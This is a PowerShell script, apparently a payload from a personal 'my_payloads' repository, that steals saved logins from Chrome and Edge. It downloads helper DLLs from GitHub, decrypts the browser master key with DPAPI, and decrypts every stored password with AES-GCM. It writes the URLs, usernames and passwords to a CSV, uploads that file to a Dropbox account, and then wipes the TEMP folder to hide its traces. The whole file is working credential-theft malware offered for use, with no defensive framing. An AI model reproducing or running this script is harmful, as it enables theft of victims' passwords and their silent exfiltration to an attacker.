# Define browser login database paths
$ChromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"

# SQLite DLL Paths
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"
$SystemSecurityDllPath = "$env:TEMP\System.Security.dll"
$BouncyCastlePath = "$env:TEMP\BouncyCastle.Cryptography.dll"

# Download SQLite DLLs if missing
if (-not (Test-Path $SQLiteDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}
if (-not (Test-Path $SQLiteInteropPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}
if (-not (Test-Path $SystemSecurityDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.dll" -outfile $SystemSecurityDllPath
}
if (-not (Test-Path $BouncyCastlePath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/main/assets/BouncyCastle.Cryptography.dll" -OutFile $BouncyCastlePath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath -ErrorAction Stop
Add-Type -Path $SystemSecurityDllPath -ErrorAction Stop
Add-Type -Path $BouncyCastlePath -ErrorAction Stop

Add-Type -TypeDefinition @"
using System;
using System.Text;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;

public class CryptoHelper {
    public static byte[] Decrypt(byte[] encryptedData, byte[] aesKey) {
        try {
            if (encryptedData == null || encryptedData.Length < 3)
                throw new Exception("Invalid encrypted data");

            Console.WriteLine(string.Format("Encrypted Data Length: {0}", encryptedData.Length));

            if (encryptedData[0] == 118 && encryptedData[1] == 49 && encryptedData[2] == 48) {
                Console.WriteLine("Using AES-GCM Decryption");
                return DecryptAESGCM(encryptedData, aesKey);
            } else {
                Console.WriteLine("Using DPAPI Decryption");
                return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
            }
        }
        catch (Exception ex) {
            return Encoding.UTF8.GetBytes("[Unable to decrypt] Error: " + ex.Message);
        }
    }

    private static byte[] DecryptAESGCM(byte[] encryptedData, byte[] aesKey) {
        try {
            // Validate minimal length: prefix (3) + IV (12) + tag (16) = 31 bytes minimum.
            if (encryptedData.Length < 31)
                throw new Exception("Invalid AES-GCM encrypted data");

            byte[] iv = new byte[12]; // 12-byte IV
            // The authentication tag is 16 bytes and is at the end.
            byte[] tag = new byte[16];
            // The ciphertext length = total - (prefix 3 + IV 12 + tag 16)
            byte[] ciphertext = new byte[encryptedData.Length - 31];

            // Extract the IV from bytes 3 to 14
            Array.Copy(encryptedData, 3, iv, 0, 12);
            // Extract the tag from the end of the data
            Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
            // Extract the ciphertext from byte 15 onward, until before the tag
            Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);

            Console.WriteLine(string.Format("IV Length: {0}", iv.Length));
            Console.WriteLine(string.Format("Ciphertext Length: {0}", ciphertext.Length));
            Console.WriteLine(string.Format("Tag Length: {0}", tag.Length));

            // Combine ciphertext and tag into one array
            byte[] ctPlusTag = new byte[ciphertext.Length + tag.Length];
            Array.Copy(ciphertext, 0, ctPlusTag, 0, ciphertext.Length);
            Array.Copy(tag, 0, ctPlusTag, ciphertext.Length, tag.Length);

            // Initialize GCM cipher
            GcmBlockCipher gcm = new GcmBlockCipher(new AesEngine());
            AeadParameters parameters = new AeadParameters(new KeyParameter(aesKey), 128, iv, null);
            gcm.Init(false, parameters);

            byte[] decrypted = new byte[gcm.GetOutputSize(ctPlusTag.Length)];
            int len = gcm.ProcessBytes(ctPlusTag, 0, ctPlusTag.Length, decrypted, 0);
            gcm.DoFinal(decrypted, len);

            return decrypted;
        }
        catch (Exception ex){
            return Encoding.UTF8.GetBytes("[AES-GCM decryption failed] Error: " + ex.Message);
        }
    }
}
"@ -Language CSharp -ReferencedAssemblies @($BouncyCastlePath, $SystemSecurityDllPath)

function DropBox-Upload {

    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 

    $DropBoxAccessToken = "YOUR_DROPBOX_ACCESS_TOKEN"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

function Get-AESKey {
    param ($BrowserPath)
    
    $LocalStatePath = "$BrowserPath\Local State"
    
    if (-not (Test-Path $LocalStatePath)) {
        Write-Output "[!] Local State file not found!"
        return $null
    }

    $LocalState = Get-Content -Path $LocalStatePath -Raw | ConvertFrom-Json
    $EncryptedKey = [System.Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
    
    # Remove 'DPAPI' prefix (first 5 bytes)
    $EncryptedKey = $EncryptedKey[5..($EncryptedKey.Length - 1)]
    
    # Decrypt using DPAPI
    return [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

# Function to extract login data from all profiles
function Extract-Passwords {
    param (
        [string]$BrowserPath,
        [string]$BrowserName
    )

    # Check if the browser data exists
    if (-not (Test-Path $BrowserPath)) {
        Write-Output "$BrowserName not found."
        return
    }

    # Get all profiles (including "Default" and custom profiles)
    $Profiles = Get-ChildItem -Path $BrowserPath -Directory | Where-Object { $_.Name -match "Default|Profile \d+" }
    $Results = @()

    foreach ($Profile in $Profiles) {
        $LoginDB = "$($Profile.FullName)\Login Data"
        $TempDB = "$env:TEMP\$BrowserName-$($Profile.Name)-LoginData.db"

        if (Test-Path $LoginDB) {
            Copy-Item -Path $LoginDB -Destination $TempDB -Force

            # SQLite Connection String
            $ConnectionString = "Data Source=$TempDB;Version=3;"
            $Query = "SELECT origin_url, username_value, password_value FROM logins"

            # Open SQLite connection
            $SQLiteConnection = New-Object System.Data.SQLite.SQLiteConnection($ConnectionString)
            $SQLiteConnection.Open()
            $SQLiteCommand = $SQLiteConnection.CreateCommand()
            $SQLiteCommand.CommandText = $Query

            $SQLiteReader = $SQLiteCommand.ExecuteReader()

            while ($SQLiteReader.Read()) {
                $url = $SQLiteReader["origin_url"]
                $username = $SQLiteReader["username_value"]
                $encryptedPassword = $SQLiteReader["password_value"]

                # Get key and Decrypt password
                $AESKey = Get-AESKey -BrowserPath $BrowserPath

                try {
                    if ($encryptedPassword -is [System.Byte[]] -and $encryptedPassword.Length -gt 0) {
                        $decryptedPassword = [CryptoHelper]::Decrypt($encryptedPassword, $AESKey)
                        $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPassword)
                    } else {
                        $decryptedPassword = "[Invalid password format]"
                    }
                }
                catch {
                    Write-Error "Error decrypting password from ${username}: $_"
                    $decryptedPassword = "[Unable to decrypt]"
                }                

                Write-Output "[$BrowserName - $($Profile.Name)]"
                Write-Output "URL: $url"
                Write-Output "Username: $username"
                Write-Output "Password: $decryptedPassword"
                Write-Output "--------------------------------`n"

                if ($decryptedPassword -and -not $decryptedPassword.StartsWith("[") -and $decryptedPassword -ne "[Invalid password format]") {
                    $Results = $Results + [pscustomobject]@{
                        Browser  = $BrowserName
                        Profile  = $Profile.Name
                        URL      = $url
                        Username = $username
                        Password = $decryptedPassword
                    }
                    Write-Output "Stored in results: $username `n"
                }
            }

            $SQLiteReader.Close()
            $SQLiteConnection.Close()
        }
    }
    if ($Results.Count -gt 0) {
        $CsvPath = "$env:TEMP\$($Profile.Name)-$BrowserName-$(Get-Date -Format dd-MMMM-yyyy_hh-mm-ss)-DecryptedPasswords.csv"
        $Results | Export-Csv -Path $CsvPath -NoTypeInformation
        Write-Output "Saved: $CsvPath `n"
        $CsvPath | DropBox-Upload
    } else {
        Write-Output "No decrypted passwords found for $BrowserName browser `n"
    }
}

Extract-Passwords -BrowserPath $ChromePath -BrowserName "Chrome"
Extract-Passwords -BrowserPath $EdgePath -BrowserName "Edge"

Start-Sleep -Milliseconds 500
Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\*' -Force -Recurse -ErrorAction SilentlyContinue" -NoNewWindow